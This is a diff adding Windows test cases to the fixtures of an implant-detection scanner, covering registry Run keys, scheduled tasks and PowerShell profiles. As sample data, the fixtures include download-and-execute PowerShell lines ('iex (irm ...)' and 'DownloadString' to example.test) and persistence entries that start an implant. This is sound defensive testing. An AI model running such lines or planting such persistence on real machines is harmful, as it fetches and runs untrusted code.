@@ -1618,6 +1618,110 @@ host_case(
     },
 )
 
+# ---------------------------------------------------------------------------
+# Windows, as a machine handed over as data. The same boundary as Linux and
+# macOS: what is not a file is a registry Run entry or a scheduled task, and
+# both are answers the case supplies.
+# ---------------------------------------------------------------------------
+
+RUN_KEY = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+
+
+def windows_state(**answers):
+    return host_state(platform="windows", crontab=None,
+                      **{"run_keys": "", "scheduled_tasks": "", **answers})
+
+
+host_case(
+    "host-windows-quiet-machine-is-clean",
+    why="A Windows machine with nothing in its Run keys, no scheduled task "
+        "of its own and nothing running is clean, and every section says it "
+        "looked. Before this, the Rust engine refused Windows outright unless "
+        "told to read files only, and the machine check was a separate "
+        "PowerShell script nothing could test.",
+    host=windows_state(),
+    expect={
+        "exit": 0,
+        "findings": [{"level": "ok", "match": "0 Run key entries, none containing an indicator"},
+                     {"level": "ok", "match": "no PowerShell profile in the home directory"}],
+        "must_not_report": NOTHING_FOUND,
+    },
+)
+
+host_case(
+    "host-windows-run-key-starting-the-implant",
+    why="The implant registers itself to start with Windows. A Run entry "
+        "whose command is the implant is confirmed with nothing on disk, and "
+        "the finding says how to remove it, with the value's name quoted so "
+        "that a name containing a quote cannot end the command early. An "
+        "ordinary entry beside it is not a finding.",
+    host=windows_state(run_keys=
+        RUN_KEY + "\tOneDrive\t\"C:\\Program Files\\OneDrive\\OneDrive.exe\" /background\n"
+        + RUN_KEY + "\tSys's Helper\tC:\\Users\\x\\AppData\\Local\\{{IMPLANT}}.exe --quiet\n"),
+    expect={
+        "exit": 2,
+        "findings": [{"level": "HIT", "match": "implant run key entry", "path": "Sys's Helper"}],
+        "must_print": ["Remove-ItemProperty", "'Sys''s"],
+        "must_not_report": ["OneDrive"],
+    },
+)
+
+host_case(
+    "host-windows-implant-task-cannot-hide-among-windows-own",
+    why="Windows ships hundreds of scheduled tasks under \\Microsoft\\, many "
+        "of which run PowerShell, and listing them for review buries the one "
+        "that matters. They are not listed. They are still checked: a task "
+        "named for the implant is confirmed wherever it sits, because "
+        "registering under \\Microsoft\\ is otherwise all an implant has to "
+        "do. A task of the operator's own that pipes a download into "
+        "PowerShell is review.",
+    host=windows_state(scheduled_tasks=
+        "\\Microsoft\\Windows\\UpdateOrchestrator\\\tSchedule Scan\tpowershell.exe -File http-check.ps1\n"
+        "\\Microsoft\\Windows\\\t{{IMPLANT}}\tC:\\ProgramData\\svc.exe\n"
+        "\\\tNightly\tpowershell -c iex (irm http://example.test/a)\n"),
+    expect={
+        "exit": 2,
+        "findings": [{"level": "HIT", "match": "implant scheduled task registered"},
+                     {"level": "review", "match": "scheduled task runs a network or interpreter command", "path": "Nightly"}],
+        "must_print": ["Unregister-ScheduledTask"],
+        "must_not_report": ["Schedule Scan"],
+    },
+)
+
+host_case(
+    "host-windows-registry-not-read-is-not-clean",
+    why="If PowerShell cannot be run, the Run keys and the scheduled tasks "
+        "were not read. That is not the same as there being none, and the "
+        "run must not exit 0 on the strength of two questions nobody "
+        "answered.",
+    host=windows_state(run_keys=None, scheduled_tasks=None),
+    expect={
+        "exit": 1,
+        "findings": [{"level": "review", "match": "could not read the registry Run keys"},
+                     {"level": "review", "match": "could not list the scheduled tasks"}],
+        "must_not_report": ["[HIT]"],
+    },
+)
+
+host_case(
+    "host-windows-powershell-profile-downloads-and-runs",
+    why="A PowerShell profile runs in every new PowerShell window. One that "
+        "downloads a script and executes it is somebody else's code at every "
+        "prompt, and nobody writes that line by accident. The same line "
+        "commented out runs nothing and is clean.",
+    host=windows_state(),
+    home={"Documents/PowerShell/Microsoft.PowerShell_profile.ps1":
+              "Set-Alias ll ls\nIEX (New-Object Net.WebClient).DownloadString('http://example.test/a')\n",
+          "Documents/WindowsPowerShell/profile.ps1":
+              "# iex (irm http://example.test/install.ps1)\nSet-Alias g git\n"},
+    expect={
+        "exit": 2,
+        "findings": [{"level": "HIT", "match": "PowerShell profile downloads and executes code",
+                      "path": "Documents/PowerShell/Microsoft.PowerShell_profile.ps1"},
+                     {"level": "ok", "match": "WindowsPowerShell/profile.ps1"}],
+    },
+)
+
 for name, body in CASES.items():
     with open(os.path.join(D, name + ".json"), "w") as f:
         json.dump(body, f, indent=2)
